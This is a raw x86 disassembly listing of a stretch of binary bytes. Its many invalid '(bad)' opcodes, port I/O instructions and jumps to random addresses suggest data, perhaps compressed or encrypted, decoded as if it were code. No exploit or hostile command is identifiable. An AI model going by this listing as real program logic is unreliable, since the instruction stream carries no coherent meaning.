  416179:	call   0x9d58ec39
  41617e:	(bad)  
  41617f:	sbb    DWORD PTR [ecx-0x11],ebx
  416182:	in     al,0xf1
  416184:	ins    DWORD PTR es:[edi],dx
  416185:	(bad)  
  416187:	test   eax,0xe34edb47
  41618c:	cdq    
  41618d:	stos   BYTE PTR es:[edi],al
  41618e:	push   edx
  41618f:	(bad)  
  416190:	(bad)  [esi+0x32]
  416193:	ss out 0x30,eax
  416196:	loop   0x4161d9
  416198:	ss cmc 
  41619a:	dec    esi
  41619b:	test   DWORD PTR [esi],ebp
  41619d:	shl    bl,0xd1
  4161a0:	mov    esi,0x4aef768f
  4161a5:	sub    al,0x7
  4161a7:	fxch   st(3)
  4161a9:	fist   DWORD PTR [eax]
  4161ab:	lods   eax,DWORD PTR ds:[esi]
  4161ac:	push   edi
  4161ad:	sbb    bl,0xaa
  4161b0:	shr    BYTE PTR [edx],cl
  4161b2:	xchg   ecx,eax
  4161b3:	inc    esi
  4161b4:	add    ebp,DWORD PTR [ebx-0x71]
  4161b7:	das    
  4161b8:	add    ch,0x77
  4161bb:	cmp    DWORD PTR [ecx+eiz*2],0x1468f5dd
  4161c2:	scas   eax,DWORD PTR es:[edi]
  4161c3:	(bad)  [ebp-0x78]
  4161c6:	bound  ebp,QWORD PTR [edi-0x14b564e1]
  4161cc:	pop    ebp
  4161cd:	sbb    eax,0x2c04b134
  4161d2:	dec    edx
  4161d3:	mov    dh,0xbc
  4161d5:	mov    ecx,0xaee55e1f
  4161da:	out    dx,eax
  4161db:	jle    0x4161ca
  4161dd:	xchg   ecx,eax
  4161de:	in     al,dx
  4161df:	out    dx,al
  4161e0:	aaa    
  4161e1:	outs   dx,DWORD PTR ds:[esi]
  4161e2:	sbb    DWORD PTR [esi],edx
  4161e4:	add    dl,al
  4161e6:	sub    al,0x2d
  4161e8:	hlt    
  4161e9:	in     eax,dx
  4161ea:	(bad)  [ecx]
  4161ec:	mov    dl,0xd4
  4161ee:	sub    DWORD PTR ds:[eax],ebx
  4161f1:	pop    ds
  4161f2:	xchg   esp,eax
  4161f3:	leave  
  4161f4:	mov    bh,0xa2
  4161f6:	or     cl,BYTE PTR [edi+eax*4+0x37]
  4161fa:	pusha  
  4161fb:	or     ecx,DWORD PTR [ebx+0x6ff832cf]
  416201:	and    eax,0xc0320677
  416206:	or     eax,DWORD PTR [ebp-0x360cf788]
  41620c:	rcr    DWORD PTR [esi],1
  41620e:	aaa    
  41620f:	pop    eax
  416210:	mov    ecx,0x228d7d7b
  416215:	sbb    eax,0x93e7d2b
  41621a:	push   ebx
  41621b:	cld    
  41621c:	sub    DWORD PTR [edx-0x14],ebp
  41621f:	jne    0x41623a
  416221:	imul   esp,DWORD PTR [ecx+edi*4],0xfffffff5
  416225:	pop    ss
  416226:	dec    ebx
  416227:	jmp    0x41626e
  416229:	mov    WORD PTR [eax],?
  41622b:	repz sub ch,BYTE PTR [ecx+0x580481e6]
  416232:	xlat   BYTE PTR ds:[ebx]
  416233:	ss call 0xd9ddc688
  416239:	pushf  
  41623a:	jnp    0x416246
  41623c:	inc    esp
  41623d:	imul   BYTE PTR [ebx-0xe94573f]
  416243:	in     al,dx
  416244:	push   edx
  416245:	(bad)  
  416247:	mov    BYTE PTR [ebx+0x5e],ch
  41624a:	jg     0x416298
  41624c:	jne    0x4162cd
  41624e:	frstor [eax-0x24]
  416251:	dec    ecx
  416252:	inc    ebx
  416253:	xor    al,al
  416255:	sbb    dl,BYTE PTR [ebx-0x5c64ba80]
  41625b:	xchg   DWORD PTR [edx],edi
  41625d:	mov    esi,0x65ba5acd
  416262:	mov    dh,BYTE PTR [ebp+0x8]
  416265:	dec    eax
  416266:	ret    
  416267:	mov    esi,0x71d499e6
  41626c:	test   DWORD PTR [ecx],ecx
  41626e:	test   BYTE PTR [eax+0x4e65ea05],ch
  416274:	mov    cl,BYTE PTR [edi-0x4a]
  416277:	mov    ah,0x10
  416279:	test   al,0x5d
  41627b:	inc    esp
  41627c:	fistp  WORD PTR [edi-0x79]
  41627f:	lahf   
  416280:	push   esi
  416281:	or     edx,ecx
  416283:	sbb    edi,eax
  416285:	je     0x416300
  416287:	mov    dl,0xca
  416289:	add    BYTE PTR [esi],cl
  41628b:	stc    
  41628c:	cld    
  41628d:	(bad)  
  41628e:	std    
  41628f:	mov    ah,0x70
  416291:	retf   0xd81e
  416294:	repz scas al,BYTE PTR es:[edi]
  416296:	xor    cl,dl
  416298:	xchg   edi,eax
  416299:	mov    cl,0x1a
  41629b:	xchg   esp,eax
  41629c:	out    dx,al
  41629d:	dec    ebx
  41629e:	(bad)  
  4162a0:	jle    0x4162e8
  4162a2:	data16 test BYTE PTR [esi],dh
  4162a5:	sbb    edi,DWORD PTR [eax+esi*8]
  4162a8:	adc    al,0xef
  4162aa:	add    edi,ebx
  4162ac:	pop    edi
  4162ad:	push   eax
  4162ae:	(bad)  
  4162b0:	inc    eax
  4162b1:	xor    al,0x66
  4162b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b4:	xchg   edi,eax
  4162b5:	sub    eax,0xf28b1a6f
  4162ba:	sub    cl,BYTE PTR [edi+0x4f8c160a]
  4162c0:	mov    ah,0x64
  4162c2:	cs mov al,0xa0
  4162c5:	outs   dx,DWORD PTR ds:[esi]
  4162c6:	xchg   ebp,eax
  4162c7:	leave  
  4162c8:	mov    dh,0xe9
  4162ca:	stos   BYTE PTR es:[edi],al
  4162cb:	out    0xf9,eax
  4162cd:	lods   al,BYTE PTR ds:[esi]
  4162ce:	add    al,cl
  4162d0:	mov    ebx,0xf2a03595
  4162d5:	test   DWORD PTR [ebx+0x3bbe85a1],0xd145650e
  4162df:	into   
  4162e0:	jns    0x416334
  4162e2:	in     al,dx
  4162e3:	out    0x4d,al
  4162e5:	call   0x65edc116
  4162ea:	sbb    al,0xc7
  4162ec:	push   ebp
  4162ed:	jle    0x4162bf
  4162ef:	stc    
  4162f0:	ror    BYTE PTR [edi+ecx*1+0x3654683f],0xfa
  4162f8:	add    BYTE PTR [bp+si],bh
  4162fb:	dec    esp
  4162fc:	xchg   edx,eax
  4162fd:	jno    0x4162b4
  4162ff:	add    ecx,ebx
  416301:	jne    0x4162b0
  416303:	data16 sub dl,BYTE PTR [ebp+0x44bb6aac]
  41630a:	pop    esi
  41630b:	mov    ah,0xe
  41630d:	push   ecx
  41630e:	mov    edx,0x5d72629a
  416313:	dec    ebx
  416314:	ss clc 
  416316:	pop    eax
  416317:	pop    eax
  416318:	jne    0x416316
  41631a:	jmp    0xe256dc39
  41631f:	xchg   BYTE PTR [esi+0xd],ah
  416322:	xchg   ebx,eax
  416323:	adc    BYTE PTR [eax-0x2],dl
  416326:	xchg   DWORD PTR [ecx],ebp
  416328:	pusha  
  416329:	imul   ebx,DWORD PTR cs:[esi+0x42957f31],0xffffff89
  416331:	loope  0x41639b
  416333:	push   es
  416334:	(bad)  
  416336:	popf   
  416337:	fidiv  WORD PTR [ebx-0x44]
  41633a:	and    BYTE PTR [ecx-0x78],0x8c
  41633e:	or     ebp,DWORD PTR [ecx-0x1f]
  416341:	outs   dx,BYTE PTR ds:[esi]
  416342:	ins    BYTE PTR es:[edi],dx
  416343:	xchg   esp,eax
  416344:	repz inc edx
  416346:	xchg   DWORD PTR [esi-0xfc69001],ebp
  41634c:	jb     0x416300
  41634e:	out    dx,eax
  41634f:	rol    BYTE PTR [edi+ebx*2],cl
  416352:	pusha  
  416353:	mov    esp,0x5225c39a
  416358:	sbb    DWORD PTR [esp+edi*2],edx
  41635b:	jo     0x416371
  41635d:	xor    BYTE PTR [eax],dh
  41635f:	or     bl,BYTE PTR [esi-0x79d20dd0]
  416365:	ror    DWORD PTR [esi],cl
  416367:	cdq    
  416368:	fcomp  DWORD PTR [eax+0x27c7cd59]
  41636e:	adc    eax,0x841b6c27
  416373:	dec    ebp
  416374:	jl     0x416301
  416376:	mov    cl,0x8d
  416378:	pop    edi
  416379:	mov    bl,0x43
  41637b:	out    0x4b,eax
  41637d:	adc    ebp,0xc4240c7b
  416383:	inc    ebx
  416384:	gs leave 
  416386:	push   ss
  416387:	mov    eax,ds:0xaf85a497
  41638c:	cdq    
  41638d:	into   
  41638e:	loop   0x4163c8
  416390:	idiv   ebx
  416392:	cmp    BYTE PTR [eax-0x39eb32c9],dl
  416398:	cmp    eax,0x791b7b9d
  41639d:	xchg   esi,eax
  41639e:	into   
  41639f:	stc    
  4163a0:	mov    ebx,ecx
  4163a2:	fisub  WORD PTR [ebp+0x2a]
  4163a5:	mov    ds:0xc21c608c,eax
  4163aa:	retf   
  4163ab:	xchg   DWORD PTR [eax+ecx*1-0x2c57936c],esp
  4163b2:	push   eax
  4163b3:	cld    
  4163b4:	jmp    0x385c:0x5a999f76
  4163bb:	pop    ds
  4163bc:	out    0x23,eax
  4163be:	sub    esi,ecx
  4163c0:	aam    0xea
  4163c2:	enter  0xcaaa,0x10
  4163c6:	fidiv  DWORD PTR [esi]
  4163c8:	shl    DWORD PTR [edx+0xaa2fea6],cl
  4163ce:	xor    BYTE PTR [edx-0x74],dh
  4163d1:	cmp    DWORD PTR [edi+edx*8],0x4b22f700
  4163d8:	xchg   esp,eax
  4163d9:	inc    ebp
  4163da:	jnp    0x4163b2
  4163dc:	add    al,0xb9
  4163de:	add    edx,DWORD PTR [edx+ebp*8]
  4163e1:	sub    al,0xc1
  4163e3:	ds call 0xa1a0:0x4f7a49c1
  4163eb:	pop    ss
  4163ec:	sbb    dh,BYTE PTR [edx+edi*2+0x20]
  4163f0:	mov    cl,0x62
  4163f2:	js     0x41646f
  4163f4:	test   eax,0x9ccf450d
  4163f9:	jmp    0x1a87:0x8bf896e2
  416400:	and    ecx,DWORD PTR [esi+0x2d8a0814]
  416406:	stos   BYTE PTR es:[edi],al
  416407:	(bad)  
  416408:	mov    ebp,0xebd4e25d
  41640d:	shl    dh,cl
  41640f:	fs dec ebp
  416411:	(bad)  
  416412:	into   
  416413:	push   ecx
  416414:	daa    
  416415:	lods   al,BYTE PTR ds:[esi]
  416416:	mov    ch,0x9a
  416418:	stos   BYTE PTR es:[edi],al
  416419:	iret   
  41641a:	and    dl,BYTE PTR [ecx]
  41641c:	dec    ebp
  41641d:	push   0x6e1f92da
  416422:	inc    edx
  416423:	rol    DWORD PTR [ecx+ebx*4],0xbd
  416427:	hlt    
  416428:	sbb    BYTE PTR [ecx-0xa],0x8e
  41642c:	jnp    0x416423
  41642e:	pop    eax
  41642f:	mov    ch,0xaa
  416431:	adc    eax,0x1d67722
  416436:	dec    ebx
  416437:	mov    esp,0xe9e1b3f
  41643c:	push   0x71
  41643e:	inc    ebp
  41643f:	in     eax,0xa7
  416441:	or     eax,esp
  416443:	pop    ebx
  416444:	mov    ebx,0x68a107b3
  416449:	mov    dh,0xa
  41644b:	xchg   ecx,eax
  41644c:	push   es
  41644d:	mov    edi,0x2b75924
  416452:	push   0xffffffd2
  416454:	mov    esi,0x970a3e4e
  416459:	push   ebp
  41645a:	xchg   ecx,ebx
  41645c:	or     al,0xb5
  41645e:	ss int 0xc1
  416461:	pop    ecx
  416462:	mov    bl,0x80
  416464:	cli    
  416465:	fisttp WORD PTR [ecx+eax*8+0x126f8157]
  41646c:	cs daa 
  41646e:	xchg   BYTE PTR [edx],bl
  416470:	hlt    
  416471:	shl    DWORD PTR [eax-0x402143b3],cl
  416477:	sbb    BYTE PTR [ebx+0x45cadff8],ah
  41647d:	addr16 mov ds:0x6665,eax
  416481:	pop    eax
  416482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416483:	imul   ebx,DWORD PTR [ebx]
  416486:	pop    ecx
  416487:	pushf  
  416488:	mov    ah,BYTE PTR ds:0xb4b345e3
  41648e:	push   es
  41648f:	jl     0x4164c2
  416491:	xchg   edx,eax
  416492:	rcr    cl,1
  416494:	jl     0x416492
  416496:	inc    ebp
  416497:	inc    ecx
  416498:	push   eax
  416499:	jl     0x4164e1
  41649b:	hlt    
  41649c:	mov    ebp,0x1ae53fdc
  4164a1:	mov    ebx,0x7d81510e
  4164a6:	rcl    BYTE PTR [edi+0x56],1
  4164a9:	test   BYTE PTR [eax],ah
  4164ab:	into   
  4164ac:	ins    DWORD PTR es:[edi],dx
  4164ad:	outs   dx,DWORD PTR ds:[esi]
  4164af:	jae    0x41650d
  4164b1:	mov    cl,0x93
  4164b3:	aaa    
  4164b4:	call   0xb29b1b2e
  4164b9:	ins    BYTE PTR es:[edi],dx
  4164ba:	sub    al,0xb7
  4164bc:	xchg   esi,eax
  4164bd:	mov    ebx,edi
  4164bf:	mov    ds:0xb817bfe2,eax
  4164c4:	stc    
  4164c5:	jnp    0x416506
  4164c7:	mov    bh,0xaa
  4164c9:	lock push 0xffffffce
  4164cc:	in     eax,0x7e
  4164ce:	push   esi
  4164cf:	cwde   
  4164d0:	scas   al,BYTE PTR es:[edi]
  4164d1:	stc    
  4164d2:	(bad)  [ecx+0x3eefc09d]
  4164d8:	inc    ebx
  4164d9:	pop    esp
  4164da:	and    ah,ah
  4164dc:	mov    ds:0x83fd657f,eax
  4164e1:	fsubr  QWORD PTR [edx]
  4164e3:	retf   0xdd5
  4164e6:	test   eax,0x783e4c78
  4164eb:	out    dx,eax
  4164ec:	push   ebp
  4164ed:	mov    ds:0xd0bad2a1,eax
  4164f2:	mov    al,0xeb
  4164f4:	dec    esp
  4164f5:	push   esp
  4164f6:	push   0x956fe5fd
  4164fb:	out    0x2,al
  4164fd:	jle    0x41650b
  4164ff:	add    al,0xb9
  416501:	out    0xe3,eax
  416503:	scas   al,BYTE PTR es:[edi]
  416504:	cmp    ebx,DWORD PTR [ecx+0x7079445b]
  41650a:	pop    edx
  41650b:	jp     0x4164c2
  41650d:	(bad)  
  41650e:	and    BYTE PTR [ebx+ecx*8],ch
  416511:	sbb    bh,BYTE PTR [edx-0x2d0a628e]
  416517:	out    0x1,al
  416519:	inc    ebp
  41651a:	pop    ecx
  41651b:	pop    esi
  41651c:	mov    al,0x28
  41651e:	cmc    
  41651f:	pusha  
  416520:	mov    esi,DWORD PTR [esi+0x24]
  416523:	mov    ax,0xe563
  416527:	hlt    
  416528:	adc    DWORD PTR [esp+ebx*2-0x10],ebx
  41652c:	clc    
  41652d:	push   esi
  41652e:	sahf   
  41652f:	push   es
  416530:	pop    ebx
  416531:	sbb    DWORD PTR [ecx-0x5bb20f7e],0x4e9b8824
  41653b:	mov    bh,0x53
  41653d:	jle    0x4164c9
  41653f:	les    ecx,FWORD PTR [ecx+esi*2]
  416542:	das    
  416543:	pop    esp
  416544:	push   esi
  416545:	inc    esp
  416546:	imul   ebp,DWORD PTR [ebp+0x3e3da8be],0xaee766de
  416550:	jns    0x4164fd
  416552:	cli    
  416553:	sbb    ch,bl
  416555:	xor    eax,DWORD PTR [ebx+eax*1-0xe617a80]
  41655c:	int3   
  41655d:	fbstp  TBYTE PTR [edi-0x70d00221]
  416563:	and    DWORD PTR [ecx+edi*4],edi
  416566:	arpl   WORD PTR [edx-0x3364e9b],di
  41656c:	pop    ebx
  41656d:	aad    0x64
  41656f:	adc    BYTE PTR [edi-0xf6ff68a],bh
  416575:	fs inc ebx
  416577:	xchg   edi,eax
  416578:	xor    cl,BYTE PTR [ecx+0x5]
  41657b:	pop    ebx
  41657c:	sub    DWORD PTR [eax],eax
  41657e:	int3   
  41657f:	push   edx
  416580:	(bad)  
  416581:	pushf  
  416582:	mov    ebp,0xf9fdd6b9
  416587:	lea    eax,[edi+0x72]
  41658a:	test   eax,0x5a4de51e
  41658f:	cs mov esi,0x71ff4ecd
  416595:	push   ebp
  416596:	mov    bh,0xc
  416598:	xor    eax,0xdc6c33e
  41659d:	and    al,0xf8
  41659f:	pop    esi
  4165a0:	scas   eax,DWORD PTR es:[edi]
  4165a1:	cli    
  4165a2:	mov    ecx,0x661d37f
  4165a7:	repz cmp eax,0xabb3421e
  4165ad:	or     ecx,DWORD PTR [ebx+0x16e6e216]
  4165b3:	and    bl,ah
  4165b5:	pop    DWORD PTR [ecx-0x3ac6db19]
  4165bb:	dec    ebp
  4165bc:	stos   DWORD PTR es:[edi],eax
  4165bd:	loope  0x41660c
  4165bf:	cmp    eax,0x9e9f347f
  4165c4:	adc    ch,BYTE PTR ds:0xf210f7cf
  4165ca:	ss jbe 0x4165bf
  4165cd:	inc    esi
  4165ce:	inc    ebp
  4165cf:	jbe    0x41659d
  4165d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165d2:	or     al,0x44
  4165d4:	inc    edi
  4165d5:	sub    ecx,ebp
  4165d7:	out    dx,eax
  4165d8:	add    ecx,edx
  4165da:	fstp   TBYTE PTR [edx]
  4165dc:	adc    BYTE PTR [ecx],bh
  4165de:	xor    al,0xd
  4165e0:	mov    ah,0xf3
  4165e2:	ffree  st(2)
  4165e4:	cmp    DWORD PTR [edi],ecx
  4165e6:	test   al,0xb8
  4165e8:	jno    0x4165d9
  4165ea:	js     0x416631
  4165ec:	fdiv   st,st(1)
  4165ee:	aaa    
  4165ef:	je     0x41657c
  4165f1:	(bad)  
  4165f2:	(bad)  
  4165f3:	lods   al,BYTE PTR ds:[esi]
  4165f4:	ins    DWORD PTR es:[edi],dx
  4165f5:	shr    DWORD PTR [ebp-0x56],cl
  4165f8:	mov    al,0x35
  4165fa:	inc    esp
  4165fb:	das    
  4165fc:	inc    DWORD PTR [edi+esi*1-0x51]
  416600:	ret    
  416601:	cli    
  416602:	(bad)  
  416604:	sbb    eax,0x4cfffa6c
  416609:	xor    ebx,ebp
  41660b:	xor    eax,0x209f3f31
  416610:	xor    esi,DWORD PTR ds:0x957d0369
  416616:	outs   dx,BYTE PTR ds:[esi]
  416617:	dec    esi
  416618:	aad    0xa1
  41661a:	popa   
  41661b:	imul   edx,DWORD PTR [eax+0x26],0xffffffaf
  41661f:	mov    al,0xc4
  416621:	das    
  416622:	inc    edi
  416623:	xchg   esi,eax
  416624:	sbb    DWORD PTR gs:[bp+di],edx
  416628:	fld    TBYTE PTR gs:[edx+eiz*4-0x1d]
  41662d:	test   DWORD PTR [eax+0x2a],esi
  416630:	scas   eax,DWORD PTR es:[edi]
  416631:	cmp    DWORD PTR [ebp+0x4358ade0],esi
  416637:	xor    BYTE PTR [edx],dh
  416639:	ja     0x416680
  41663b:	pusha  
  41663c:	mov    ds:0x9aa9047b,eax
  416641:	mov    ecx,esi
  416643:	sub    dl,cl
  416645:	outs   dx,DWORD PTR ds:[esi]
  416646:	fisubr DWORD PTR [edi+0x4b1bda3d]
  41664c:	(bad)  
  41664d:	out    0x1e,eax
  41664f:	cli    
  416650:	sub    eax,0x18b0b8f5
  416655:	mov    edx,0x30bf9610
  41665a:	jge    0x416693
  41665c:	push   ebp
  41665d:	xchg   edx,eax
  41665e:	mov    esp,0x6b94590f
  416663:	nop
  416664:	add    eax,0x5cf91257
  416669:	sbb    ebx,DWORD PTR [ebp-0x5b]
  41666c:	cmp    dl,bh
  41666e:	mov    BYTE PTR [edi-0x6b69990],al
  416674:	icebp  
  416675:	cmp    esp,DWORD PTR [eax+0x72f60e32]
  41667b:	cmp    edx,esi
  41667d:	lds    ecx,FWORD PTR fs:[ebp+0x435d5989]
  416684:	lods   al,BYTE PTR ds:[esi]
  416685:	pop    edx
  416686:	mov    eax,0x321999c3
  41668b:	retf   0xe7fb
  41668e:	pop    esp
  41668f:	pusha  
  416690:	and    dl,al
  416692:	enter  0x938e,0xff
  416696:	pop    ds
  416697:	pop    ebp
  416698:	inc    esi
  416699:	daa    
  41669a:	and    eax,0xdde8339a
  41669f:	mov    dl,0x34
  4166a1:	jecxz  0x4166a0
  4166a3:	jg     0x416721
  4166a5:	adc    esi,ecx
  4166a7:	pop    esp
  4166a8:	mov    eax,ds:0x95d6d814
  4166ad:	push   edx
  4166ae:	and    esi,DWORD PTR [ebx+0x36]
  4166b1:	lahf   
  4166b2:	ror    BYTE PTR [esi+edx*1],cl
  4166b5:	fiadd  DWORD PTR [esi-0x56]
  4166b8:	out    0x1e,al
  4166ba:	and    BYTE PTR ss:[ebp-0x6c],ch
  4166be:	outs   dx,DWORD PTR ds:[esi]
  4166bf:	push   ebp
  4166c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166c1:	repnz inc ebp
  4166c3:	dec    esp
  4166c4:	(bad)  
  4166c5:	scas   eax,DWORD PTR es:[edi]
  4166c6:	jle    0x4166e0
  4166c8:	lock call 0x6855dc1b
  4166ce:	pop    eax
  4166cf:	aas    
  4166d0:	ins    DWORD PTR es:[edi],dx
  4166d1:	lods   al,BYTE PTR ds:[esi]
  4166d2:	sbb    DWORD PTR [ecx],edx
  4166d4:	lds    ebp,FWORD PTR [edx+0x3f]
  4166d7:	loope  0x4166a7
  4166d9:	mov    ?,WORD PTR [edi]
  4166db:	daa    
  4166dc:	leave  
  4166dd:	in     al,dx
  4166de:	cmp    esp,DWORD PTR [edx-0x46]
  4166e1:	nop
  4166e2:	cmp    al,0x54
  4166e4:	inc    edi
  4166e5:	and    BYTE PTR [ecx+eiz*4],dl
  4166e8:	dec    esi
  4166e9:	add    al,0x7a
  4166eb:	mov    ds:0x346bdc2f,eax
  4166f0:	jo     0x41668f
  4166f2:	fld1   
  4166f4:	mov    cl,0xa6
  4166f6:	jno    0x416753
  4166f8:	push   es
  4166f9:	and    al,0xc7
  4166fb:	adc    DWORD PTR [eax+ecx*8],ebp
  4166fe:	push   eax
  4166ff:	fld    TBYTE PTR [ecx]
  416701:	fcmovb st,st(6)
  416703:	or     al,0x4c
  416705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416706:	addr16 lahf 
  416708:	iret   
  416709:	and    eax,0x3ccf2287
  41670e:	loop   0x41673e
  416710:	jae    0x416722
  416712:	dec    eax
  416713:	mov    ds:0xeaa41e01,al
  416718:	outs   dx,BYTE PTR ds:[esi]
  416719:	or     edx,ebx
  41671b:	xor    eax,0xf03d8654
  416720:	in     eax,0xab
  416722:	retf   0x2379
  416725:	adc    eax,0x44b5a120
  41672a:	int3   
  41672b:	pop    eax
  41672c:	adc    BYTE PTR [ecx-0x57],bh
  41672f:	adc    eax,0xe208fc4c
  416734:	int    0x7e
  416736:	mov    al,0x4d
  416738:	aam    0x31
  41673a:	sub    dl,BYTE PTR [edi-0x52599d88]
  416740:	in     eax,dx
  416741:	clc    
  416742:	pop    ebp
  416743:	adc    BYTE PTR [esi+0x543d0622],bl
  416749:	jb     0x4167b8
  41674b:	ins    BYTE PTR es:[edi],dx
  41674c:	out    dx,al
  41674d:	cdq    
  41674e:	dec    esi
  41674f:	jno    0x4167cf
  416751:	or     DWORD PTR [ecx],ecx
  416753:	ror    BYTE PTR ss:[esi+ebx*8],cl
  416757:	(bad)  
  416758:	ins    BYTE PTR es:[edi],dx
  416759:	inc    edx
  41675a:	xor    BYTE PTR [esi+0x35],al
  41675d:	jmp    0x35a3c1d2
  416762:	pop    es
  416763:	jno    0x416779
  416765:	lods   eax,DWORD PTR ds:[esi]
  416766:	fisttp DWORD PTR [ebp-0x28c8c4c1]
  41676c:	adc    al,0x8
  41676e:	mov    DWORD PTR [ecx+0x4a],ebp
  416771:	xchg   edi,eax
  416772:	(bad)  
  416773:	adc    al,0xe8
  416775:	stos   BYTE PTR es:[edi],al
  416776:	int3   
  416777:	imul   edi,edx,0x6a646bf9
  41677d:	xchg   BYTE PTR [esi],bl
  41677f:	out    dx,al
  416780:	(bad)  
  416782:	fbstp  TBYTE PTR [ebp-0x50cd242d]
  416788:	repz fwait
  41678a:	sbb    al,0xb3
  41678c:	sbb    eax,ebp
  41678e:	jg     0x4167d0
  416790:	ret    
  416791:	sub    cl,BYTE PTR [ecx+esi*4+0x59]
  416795:	cmp    bl,BYTE PTR [ebp+0x235cb51e]
  41679b:	mov    ds:0x3f6e811d,al
  4167a0:	repz cs sbb eax,0x6d48db6f
  4167a7:	sbb    al,0xd6
  4167a9:	fmul   QWORD PTR [edx-0x709c7d4e]
  4167af:	xor    ecx,DWORD PTR [esi-0x4b]
  4167b2:	pop    ss
  4167b3:	imul   edx,DWORD PTR ds:0x6b541117,0xfffffff4
  4167ba:	scas   al,BYTE PTR es:[edi]
  4167bb:	sub    DWORD PTR [eax+esi*1+0x5f],0x3b4e4998
  4167c3:	xchg   esp,eax
  4167c4:	shl    esp,cl
  4167c6:	inc    eax
  4167c7:	add    eax,DWORD PTR [ebx-0x35]
  4167ca:	push   esp
  4167cb:	out    dx,al
  4167cc:	jge    0x416806
  4167ce:	inc    ecx
  4167cf:	cmp    DWORD PTR [ebx+ecx*8+0x6b],0xffffffc7
  4167d4:	pop    esp
  4167d5:	mov    ch,0x91
  4167d7:	cdq    
  4167d8:	or     DWORD PTR [edi],esp
  4167da:	add    eax,0x66262be4
  4167df:	or     DWORD PTR [eax-0x63],ebx
  4167e2:	adc    ch,BYTE PTR cs:[ecx-0x61]
  4167e6:	outs   dx,BYTE PTR ds:[esi]
  4167e7:	outs   dx,DWORD PTR ds:[esi]
  4167e8:	fisub  DWORD PTR [edi+edx*2-0x4d]
  4167ec:	mov    esi,eax
  4167ee:	xor    BYTE PTR [ebx+ebx*8-0x66],0xb9
  4167f3:	jle    0x4167a1
  4167f5:	pusha  
  4167f6:	sub    BYTE PTR [eax],dl
  4167f8:	dec    esp
  4167f9:	retf   0xe567
  4167fc:	bnd jge 0x41678b
  4167ff:	ja     0x4167cd
  416801:	sub    DWORD PTR [eax-0x6b4522de],esp
  416807:	mov    al,ds:0x4985693c
  41680c:	aad    0xa9
  41680e:	bound  ebx,QWORD PTR [ecx-0x59]
  416811:	mov    al,ds:0x9669e0fa
  416816:	pop    ecx
  416817:	das    
  416818:	lds    edi,FWORD PTR [edi+ebx*2+0x4c875b7a]
  41681f:	add    al,BYTE PTR [edx-0x16]
  416822:	jno    0x4167ea
  416824:	inc    ax
  416826:	clc    
  416827:	pop    eax
  416828:	jbe    0x41685a
  41682a:	es mov edx,0xc1feeeec
  416830:	and    BYTE PTR [ecx-0x7a76b97e],ah
  416836:	xor    DWORD PTR [ebx+0x3b],edi
  416839:	pop    edi
  41683a:	dec    esi
  41683b:	cdq    
  41683c:	jecxz  0x416867
  41683e:	jl     0x4167c5
  416840:	jg     0x41680c
  416842:	push   ds
  416843:	jbe    0x416883
  416845:	das    
  416846:	(bad)  
  416848:	repnz dec esp
  41684a:	xor    al,BYTE PTR [ebx+0x7818bbda]
  416850:	lods   al,BYTE PTR ds:[esi]
  416851:	popa   
  416852:	sub    BYTE PTR [ebx],bl
  416854:	sub    BYTE PTR [edi-0x3068340],cl
  41685a:	fidiv  DWORD PTR [edx+0x69]
  41685d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41685e:	in     eax,0x9e
  416860:	push   edi
  416861:	pop    edi
  416862:	jmp    DWORD PTR [edi]
  416864:	dec    edx
  416865:	adc    eax,0x2ac1a5fd
  41686a:	stos   DWORD PTR es:[edi],eax
  41686b:	(bad)  
  41686c:	sbb    eax,DWORD PTR [ebx]
  41686e:	cmp    al,0xb1
  416870:	or     esp,DWORD PTR [ecx-0x36]
  416873:	outs   dx,DWORD PTR ds:[esi]
  416874:	cmp    DWORD PTR [ecx-0x78a4b360],esi
  41687a:	fdivr  DWORD PTR [ecx-0x29206d95]
  416880:	sub    BYTE PTR [eax-0x73d58da1],bl
  416886:	jp     0x41682b
  416888:	dec    eax
  416889:	dec    esi
  41688a:	inc    edi
  41688b:	mov    al,0xfd
  41688d:	scas   eax,DWORD PTR es:[edi]
  41688e:	pop    ecx
  41688f:	adc    BYTE PTR [edx],0x3b
  416892:	xchg   esi,eax
  416893:	clc    
  416894:	dec    BYTE PTR [esi]
  416896:	enter  0xf640,0xc2
  41689a:	sub    DWORD PTR [edi+0x306dfdcd],ebp
  4168a0:	cmc    
  4168a1:	pushf  
  4168a2:	push   ebp
  4168a3:	int3   
  4168a4:	mov    al,ds:0xb8634a86
  4168a9:	sahf   
  4168aa:	into   
  4168ab:	in     al,0xcc
  4168ad:	mov    bh,0x41
  4168af:	mov    al,ds:0x745dab22
  4168b4:	sahf   
  4168b5:	(bad)  
  4168b6:	fistp  WORD PTR [ebp+0x7f]
  4168b9:	loop   0x416929
  4168bb:	ret    0x7561
  4168be:	xor    ebx,DWORD PTR [esi-0x68]
  4168c1:	rcl    DWORD PTR [ebx+0x9],1
  4168c4:	aaa    
  4168c5:	imul   ecx,DWORD PTR [edx+0x125ccf32],0x16
  4168cc:	mov    edx,0x2216dd97
  4168d1:	push   ss
  4168d2:	or     DWORD PTR [ecx],ecx
  4168d4:	add    BYTE PTR [edi+0x3f7999a7],ah
  4168da:	dec    edi
  4168db:	cmp    al,0xc3
  4168dd:	inc    edx
  4168de:	xchg   ebx,eax
  4168df:	xor    eax,edx
  4168e1:	mov    dl,0xe6
  4168e3:	lods   eax,DWORD PTR ds:[esi]
  4168e4:	adc    BYTE PTR [edi],bh
  4168e6:	dec    ebx
  4168e7:	mov    ecx,0x43d6b7c2
  4168ec:	jmp    0x772c887d
  4168f1:	in     al,dx
  4168f2:	add    dh,BYTE PTR [ebx-0x6b81e4eb]
  4168f8:	mov    ds:0x3adcf3ad,eax
  4168fd:	xor    eax,0x87ce11f1
  416902:	or     ch,BYTE PTR [ebx-0x37]
  416905:	nop
  416906:	xchg   DWORD PTR [ebx],edx
  416908:	or     DWORD PTR [edi-0xc],0xffffffe8
  41690c:	int    0x31
  41690e:	dec    esp
  41690f:	dec    edi
  416910:	aas    
  416911:	rcl    DWORD PTR [edi-0x114a810b],0xa5
  416918:	xor    al,0xa5
  41691a:	loopne 0x416991
  41691c:	push   ebx
  41691d:	in     eax,0x4e
  41691f:	and    al,0xca
  416921:	and    DWORD PTR [ecx-0x6f],eax
  416924:	mov    edx,0x675a13af
